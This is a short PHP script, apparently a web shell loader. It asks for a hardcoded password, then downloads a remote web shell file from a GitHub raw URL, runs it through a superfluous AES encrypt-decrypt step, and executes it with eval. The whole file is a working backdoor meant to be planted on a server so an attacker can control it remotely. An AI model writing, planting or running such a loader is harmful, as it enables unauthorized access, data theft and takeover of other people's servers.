<?php
session_start();
$pw = "plaga";

if (!isset($_SESSION['plaga_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if ($_POST['password'] === $pw) {
            $_SESSION['plaga_auth'] = true;
            header("Location: ?");
            exit;
        }
        die("Password salah bego");
    }
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Masukin">
        <button type="submit">aw</button>
    </form>
    <?php
    exit;
}


$Url = "https://raw.githubusercontent.com/yon3zu/403WebShell/refs/heads/main/403WebShell.php";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($ch);
$key = "rere599";
$method = "AES-256-CBC";
$iv = substr(hash('sha256', $key), 0, 16);
$enkripsiKode = openssl_encrypt($output, $method, $key, 0, $iv);
$decryptedContent = openssl_decrypt($enkripsiKode, $method, $key, 0, $iv);
eval('?>' . $decryptedContent);
?>
